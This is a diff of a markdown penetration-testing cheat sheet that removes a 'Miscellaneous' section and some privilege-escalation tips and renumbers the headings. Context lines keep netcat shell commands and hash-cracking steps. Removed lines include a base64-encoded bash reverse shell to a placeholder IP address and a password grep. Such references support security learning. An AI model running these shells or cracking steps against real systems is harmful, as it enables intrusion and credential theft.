@@ -7,9 +7,8 @@ Overview
 3. - [Lateral Movement](#3---lateral-movement)
 4. - [Privilege Escalation](#4---privilege-escalation)
 5. - [Brute Force](#5---brute-force)
-6. - [Miscellaneous](#6---Miscellaneous)
-7. - [Online Resources](#7---online-resources)
-8. - [Browser Plugins](#8---browser-plugins)
+6. - [Online Resources](#6---online-resources)
+7. - [Browser Plugins](#7---browser-plugins)
      
 #1. - Enumeration
 -----------------------------------------
@@ -171,7 +170,7 @@ $ nc -nv <IP address> <port> -e cmd.exe
 $ python3 -m http.server 8000
 ```
 
-- Escape Restricted Shell
+- Shell Escapes
 
 ```
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'; CTRL+Z; stty raw -echo; fg; export TERM=XTERM
@@ -241,24 +240,6 @@ C:\> .\winPEASx64.exe
 $ .\linpeas.sh
 ```
 
-- Find passwords
-
-```
-$ cat * | grep -i passw*
-```
-
-- Sudo
-
-```
-$ sudo -l
-```
-
-- Add /tmp directory to the PATH environmental variable 
-
-```
-$ export PATH=/tmp:$PATH
-```
-
 #5. - Brute Force
 -----------------------------------------
 
@@ -293,83 +274,7 @@ $ zip2john <ZIP file> > hashes.txt
 $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 ```
 
-#6. - Miscellaneous
------------------------------------------
-
-- Connect to OpenVPN
-
-```
-$ sudo openvpn <filename>.ovpn
-```
-
-- Clone a GitHub repository
-
-```
-$ git clone <URL.git>
-```
-
-- Enable a browser to resolve a hostname to a IP address
-
-```
-Edit /etc/hosts
-```
-
-- Check for local listening ports
-
-```
-$ ss -tulpn
-```
-
-- List running processes
-
-```
-$ ps aux
-```
-
-- Configure your browser to send traffic through a proxy
-
-```
-Preferences -> Network Settings -> Manual Proxy Configuration
-```
-
-- Find a file
-
-```
-$ find / -name <string> 2>/dev/null
-```
-
-- Encode a payload in base64
-
-```
-$ echo 'bash -c bash -i >&/dev/tcp/<IP address>/<port> 0>&1' | base64
-```
-
-- Create a SHA-512 hash
-
-```
-$ mkpasswd -m sha-512 Password1234
-```
-
-- Set permissions on a id_rsa file
-
-```
-$ chmod 400 id_rsa
-$ ssh -i id_rsa <username>@<IP address>
-```
-
-- Check permissions on a file
-
-```
-$ icacls <file>
-```
-
-- Read a file printing only human-readable strings
-
-```
-$ strings <file>
-```
-
-#7. - Online Resources
+#6. - Online Resources
 -----------------------------------------
 
 - Speedguide
@@ -384,7 +289,7 @@ https://www.speedguide.net/port.php?port=3389
 https://crackstation.net/
 ```
 
-#8. - Browser Plugins
+#7. - Browser Plugins
 -----------------------------------------
 
 - Wappalyzer: Website technology analyser
